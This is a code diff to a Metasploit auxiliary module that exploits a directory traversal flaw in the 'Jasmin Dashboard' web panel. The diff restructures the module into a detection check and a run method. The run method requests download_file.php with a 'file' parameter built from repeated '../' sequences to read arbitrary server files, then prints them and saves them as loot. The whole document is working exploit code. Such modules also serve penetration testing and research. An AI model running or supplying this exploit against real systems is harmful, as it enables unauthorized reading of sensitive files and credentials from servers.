@@ -6,7 +6,6 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(
@@ -47,27 +46,33 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def run_host(ip)
+  def check
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path)
     )
+    return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
+    return Exploit::CheckCode::Safe("#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") unless res.code == 200
 
-    fail_with(Failure::NotFound, 'Check TARGETURI, Jasmin Dashboard not detected') unless res.body.include? '<title>Jasmin Dashboard</title>'
+    Exploit::CheckCode::Detected('Jasmin Login page detected') if res.body.include? '<title>Jasmin Dashboard</title>'
+  end
 
+  def run
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'download_file.php'),
       'vars_get' => {
         'file' => "#{'../' * datastore['DEPTH']}#{datastore['FILE']}"
       }
     )
+    fail_with(Failure::Unknown, 'No response from server') if res.nil?
     fail_with(Failure::NotFound, 'Check FILE or DEPTH, file not found on server') if res.body.empty?
+    fail_with(Failure::UnexpectedReply, "Server returned an unexpected HTTP code: #{res.code}") unless res.code == 200
 
     print_good(res.body)
     # store loot
     path = store_loot(
       'jasmin.webpanel.dir.traversal',
       'text/plain',
-      ip,
+      datastore['rhost'],
       res.body,
       File.basename(datastore['FILE'])
     )
